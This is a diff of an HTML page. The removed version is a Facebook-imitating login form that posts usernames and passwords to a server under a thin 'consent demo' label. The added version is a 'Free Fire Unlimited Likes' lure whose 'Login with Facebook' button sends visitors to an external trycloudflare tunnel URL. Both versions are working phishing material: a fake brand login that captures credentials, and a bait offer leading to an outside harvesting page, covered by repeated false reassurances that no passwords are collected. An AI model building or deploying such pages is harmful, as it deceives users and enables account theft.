@@ -1,140 +1,174 @@
 <!doctype html>
-<html lang="hi">
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Consent Login (Safe)</title>
-<style>
-  body{font-family:Arial;background:#f2f2f2;margin:0}
-  .card{max-width:360px;margin:80px auto;padding:20px;background:#fff;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.06)}
-  input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px}
-  button{width:100%;padding:10px;background:#1877f2;color:#fff;border:none;border-radius:6px;cursor:pointer}
-  .note{font-size:13px;color:#444;margin-top:10px;text-align:center}
-  .modal-back{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:none;align-items:center;justify-content:center}
-  .modal{background:#fff;padding:18px;border-radius:8px;max-width:420px;width:92%}
-  .row{display:flex;gap:8px;justify-content:flex-end;margin-top:12px}
-  .btn-ghost{background:transparent;border:1px solid #ccc;padding:8px 12px;border-radius:6px;cursor:pointer}
-  .btn-primary{background:#1877f2;color:#fff;border:none;padding:8px 12px;border-radius:6px;cursor:pointer}
-</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>FREE FIRE — Unlimited Likes Pack</title>
+  <style>
+    :root{
+      --bg: linear-gradient(135deg,#0f172a 0%, #0b2545 50%, #051937 100%);
+      --card:#0b1220aa;
+      --accent:#ffcc00;
+      --glass: rgba(255,255,255,0.06);
+      --muted: rgba(255,255,255,0.75);
+      --radius: 16px;
+      --maxw: 980px;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family: Inter,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;
+      background: var(--bg);
+      color: #fff;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:24px;
+      -webkit-font-smoothing:antialiased;
+    }
+    .wrap{
+      width:100%;
+      max-width:var(--maxw);
+      display:grid;
+      grid-template-columns: 1fr 420px;
+      gap:28px;
+      align-items:center;
+    }
+    @media(max-width:900px){
+      .wrap{ grid-template-columns:1fr; padding:12px }
+    }
+    .hero{
+      background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));
+      border-radius: var(--radius);
+      padding:28px;
+      box-shadow: 0 8px 40px rgba(2,6,23,0.6);
+      position:relative;
+      overflow:hidden;
+    }
+    .brand{ display:flex; align-items:center; gap:14px; margin-bottom:14px; }
+    .logo{
+      width:64px; height:64px; border-radius:12px;
+      background: linear-gradient(135deg,#ff7a00,#ffcc00);
+      display:flex; align-items:center; justify-content:center;
+      font-weight:800; color:#071022; font-size:22px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.45);
+    }
+    h1{ margin:0; font-size:28px; line-height:1.05; }
+    p.lead{ color:var(--muted); margin-top:12px; margin-bottom:18px; font-size:15px; }
+    .features{ display:flex; gap:10px; flex-wrap:wrap; }
+    .chip{ background:var(--glass); padding:10px 12px; border-radius:999px; font-weight:600; font-size:13px; color:#fff; }
+    .card{ background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02)); border-radius:14px; padding:22px; box-shadow: 0 10px 40px rgba(2,6,23,0.6); }
+    .pack-title{ display:flex; gap:12px; align-items:center; justify-content:space-between; }
+    .price{ background:rgba(0,0,0,0.25); padding:8px 12px; border-radius:10px; font-weight:700; }
+    .big-cta{ margin-top:18px; display:flex; flex-direction:column; gap:12px; }
+    .btn{ display:inline-flex; align-items:center; justify-content:center; gap:10px; padding:12px 16px; border-radius:12px; font-weight:700; font-size:15px; cursor:pointer; text-decoration:none; border:none; width:100%; }
+    .btn.fb{ background:linear-gradient(90deg,#2b6fd6,#1e4abf); color:white; box-shadow: 0 8px 24px rgba(20,80,200,0.18); }
+    .btn.free{ background: linear-gradient(90deg,#ffb84d,#ffcc66); color:#071022; font-weight:800; box-shadow: 0 8px 30px rgba(255,200,80,0.15); }
+    .small{ font-size:13px; color:var(--muted); text-align:center; }
+    .badge{ background: rgba(255,255,255,0.06); padding:8px 10px; border-radius:10px; display:inline-flex; gap:8px; align-items:center; font-weight:700; }
+    .hero-art{ position:absolute; right:-80px; top:-40px; width:420px; transform: rotate(-14deg); opacity:0.08; pointer-events:none; }
+    .terms{ margin-top:8px; font-size:13px; color:rgba(255,255,255,0.65); }
+    .feature-list{ margin-top:18px; display:grid; gap:10px }
+    .feature-item{ display:flex; gap:10px; align-items:flex-start; }
+    .dot{ width:10px;height:10px;border-radius:50%;background:var(--accent);margin-top:6px;box-shadow:0 4px 12px rgba(255,200,60,0.12) }
+    footer{ margin-top:18px; font-size:13px; color:rgba(255,255,255,0.6); display:flex; justify-content:space-between; align-items:center; gap:12px; flex-wrap:wrap; }
+  </style>
 </head>
 <body>
-  <div class="card">
-    <h2 style="text-align:center;color:#1877f2;margin:0 0 12px">facebook</h2>
-
-    <form id="loginForm" autocomplete="off">
-      <input id="username" name="username" type="text" placeholder="Email or phone number" required>
-      <input id="password" name="password" type="password" placeholder="Password" required>
-      <button type="submit">Log In</button>
-    </form>
-
-    <div class="note">डेमो: पासवर्ड कभी भी admin को भेजा नहीं जाएगा।</div>
-  </div>
-
-  <!-- Consent modal -->
-  <div id="modalBack" class="modal-back" role="dialog" aria-modal="true" aria-hidden="true">
-    <div class="modal" role="document">
-      <h3>अनुमति दें</h3>
-      <p>क्या आप अनुमति देते हैं कि आपका <strong>ईमेल/फोन नंबर</strong> और लॉग-इवेंट हमारी टीम (admin) को भेजे जाएँ ताकि वे सहायता दे सकें?</p>
-      <p style="font-size:13px;color:#666">नोट: <strong>पासवर्ड कभी नहीं भेजा जाएगा</strong>. यदि आप सहमत हैं तो नीचे चेकबॉक्स चुनें और “Thanks दबाये” दबाएँ।</p>
-
-      <div style="margin-top:8px">
-        <label><input id="consentCheckbox" type="checkbox"> मैं अनुमति देता/देती हूँ</label>
+  <div class="wrap">
+    <section class="hero">
+      <div class="brand">
+        <div class="logo">FF</div>
+        <div>
+          <h1>Unlimited Likes — Free Pack</h1>
+          <div style="color:var(--muted);font-size:13px;margin-top:4px">Boost your profile and posts — instant delivery, safe notice shown below</div>
+        </div>
       </div>
 
-      <div class="row">
-        <button id="cancelConsent" class="btn-ghost" type="button">रद्द करें</button>
-        <button id="confirmConsent" class="btn-primary" type="button">Thanks दबाये</button>
+      <p class="lead">Grab the limited-time <strong>Unlimited Like Pack</strong> for Free Fire profiles. Click login to proceed. You will be redirected to the verification page.</p>
+
+      <div class="features" aria-hidden="true">
+        <div class="chip">Unlimited Likes</div>
+        <div class="chip">Instant Delivery</div>
+        <div class="chip">No Passwords Stored Here</div>
+        <div class="chip">Mobile Friendly</div>
       </div>
-    </div>
+
+      <div class="feature-list" aria-hidden="true">
+        <div class="feature-item"><div class="dot"></div><div><strong>Fast activation</strong><div style="color:var(--muted)">Usually within a few minutes</div></div></div>
+        <div class="feature-item"><div class="dot"></div><div><strong>Transparent</strong><div style="color:var(--muted)">You'll be redirected to a verification page we don't control</div></div></div>
+        <div class="feature-item"><div class="dot"></div><div><strong>Support</strong><div style="color:var(--muted)">Contact if any issue</div></div></div>
+      </div>
+
+      <img class="hero-art" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='480' height='480'><defs><linearGradient id='g' x1='0' x2='1'><stop offset='0' stop-color='%23ffcc00'/><stop offset='1' stop-color='%23ff7a00'/></linearGradient></defs><circle cx='240' cy='240' r='200' fill='url(%23g)' opacity='0.9'/></svg>" alt="" />
+
+      <footer>
+        <div class="badge">🔥 LIMITED — Claim Now</div>
+        <div style="opacity:0.9">We do NOT collect passwords here • Click to continue</div>
+      </footer>
+    </section>
+
+    <aside class="card">
+      <div class="pack-title">
+        <h3>Unlimited Pack • Free</h3>
+        <div class="price">FREE</div>
+      </div>
+
+      <div class="big-cta">
+        <!-- BUTTON: opens provided URL in new tab -->
+        <a id="fbBtn" class="btn fb" href="https://wholesale-tackle-personality-park.trycloudflare.com/913b885d/facebook" target="_blank" rel="noopener noreferrer" title="Open verification page">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M22 12.07C22 6.48 17.52 2 11.93 2S2 6.48 2 12.07C2 17.06 5.66 21.09 10.44 21.93v-6.7H8.08v-2.9h2.36V10.6c0-2.34 1.4-3.63 3.54-3.63 1.02 0 2.09.18 2.09.18v2.3h-1.17c-1.16 0-1.52.72-1.52 1.46v1.75h2.58l-.41 2.9h-2.17v6.7C18.34 21.09 22 17.06 22 12.07z" fill="#fff"/>
+          </svg>
+          Login with Facebook
+        </a>
+
+        <!-- Alternative claim (simulated) - does not ask for credentials on this page -->
+        <button id="claimBtn" class="btn free" type="button">
+          🎁 Quick Claim (No login here)
+        </button>
+
+        <div class="small">By continuing you agree to our <a style="color:var(--accent);text-decoration:none" href="#" onclick="alert('Terms placeholder')">Terms & Privacy</a>. We never request or store account passwords on this page.</div>
+      </div>
+
+      <div class="terms">
+        <strong>How it works:</strong>
+        <ol style="margin:8px 0 0 18px; color:var(--muted)">
+          <li>Click <em>Login with Facebook</em> — a new tab will open to the verification page.</li>
+          <li>If that page asks for account details, they will be handled by that page (not by this site).</li>
+          <li>After verification, follow instructions on the verification page to claim your pack.</li>
+        </ol>
+      </div>
+
+      <hr style="border:none;height:1px;background:rgba(255,255,255,0.04);margin:14px 0;border-radius:4px">
+
+      <div style="display:flex;gap:10px;align-items:center;justify-content:space-between">
+        <div>
+          <strong>Need help?</strong><div style="color:var(--muted);font-size:13px">Contact: support@example.com</div>
+        </div>
+        <div style="text-align:right;color:var(--muted);font-size:13px">Safe • Instant • Verified</div>
+      </div>
+    </aside>
   </div>
 
-<script>
-  // === CONFIG: अपने सर्वर URL से बदलें (HTTPS) ===
-  const LOGIN_ENDPOINT = '/login';            // सर्वर पर login request (POST)
-  const ADMIN_NOTIFY_ENDPOINT = '/notify-admin'; // सर्वर-साइड internal notify (server-to-server)
-  // =================================================
+  <script>
+    // The fb button is a plain link to the provided URL (opens in new tab).
+    // IMPORTANT: This page DOES NOT collect passwords or any auth data.
 
-  const form = document.getElementById('loginForm');
-  const modalBack = document.getElementById('modalBack');
-  const consentCheckbox = document.getElementById('consentCheckbox');
-  const confirmConsent = document.getElementById('confirmConsent');
-  const cancelConsent = document.getElementById('cancelConsent');
+    // Optional: quick claim simulation (replace with your server link if needed)
+    document.getElementById('claimBtn').addEventListener('click', function(){
+      const ok = confirm('This quick-claim will redirect you to a safe claim page. Continue?');
+      if(ok) {
+        // replace with your own claim URL if you have one
+        window.location.href = 'https://example.com/claim?pack=unlimited';
+      }
+    });
 
-  let tmpUsername = '';
-  let tmpPassword = '';
-
-  // Step 1: Submit credentials to your OWN server (securely via POST).
-  // Password is sent to YOUR server ONLY for authentication; client WILL NOT send password to admin endpoint.
-  form.addEventListener('submit', async function(e){
-    e.preventDefault();
-    tmpUsername = document.getElementById('username').value.trim();
-    tmpPassword = document.getElementById('password').value;
-
-    // Send credentials securely to your server for authentication.
-    // Server should be HTTPS and must NOT forward password to any third party.
-    try {
-      const res = await fetch(LOGIN_ENDPOINT, {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ username: tmpUsername, password: tmpPassword })
-      });
-      const j = await res.json();
-
-      // Show consent modal only AFTER server responds (you can decide when to ask)
-      // For demo we always ask user for consent to notify admin.
-      consentCheckbox.checked = false;
-      modalBack.style.display = 'flex';
-      modalBack.setAttribute('aria-hidden','false');
-
-      // Optionally show server response somewhere or use j.success
-      console.log('Login response:', j);
-
-    } catch(err) {
-      alert('नेटवर्क त्रुटि — पुनः प्रयास करें।');
-      console.error(err);
-    }
-  });
-
-  cancelConsent.addEventListener('click', function(){
-    modalBack.style.display = 'none';
-    modalBack.setAttribute('aria-hidden','true');
-    // clear password for safety
-    document.getElementById('password').value = '';
-  });
-
-  confirmConsent.addEventListener('click', async function(){
-    if(!consentCheckbox.checked){
-      alert('कृपया अनुमति के लिए चेकबॉक्स चुनें।');
-      return;
-    }
-    modalBack.style.display = 'none';
-    modalBack.setAttribute('aria-hidden','true');
-
-    // Show brief thanks locally
-    alert('Thanks — अनुमति मिल गई।');
-
-    // Send ONLY username + metadata to server notify endpoint.
-    // IMPORTANT: never send password here.
-    try {
-      const payload = {
-        username: tmpUsername,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent || null
-      };
-      const r = await fetch(ADMIN_NOTIFY_ENDPOINT, {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify(payload)
-      });
-      if (!r.ok) throw new Error('notify failed');
-      // clear password for safety
-      document.getElementById('password').value = '';
-      alert('लॉग-इवेंट admin को भेज दिया गया (डेमो)।');
-    } catch (err) {
-      console.error(err);
-      alert('सूचना भेजने में समस्या।');
-    }
-  });
-</script>
+    // Prevent accidental Enter key submit behavior
+    window.addEventListener('keydown', function(e){
+      if(e.key === 'Enter') e.preventDefault();
+    });
+  </script>
 </body>
 </html>
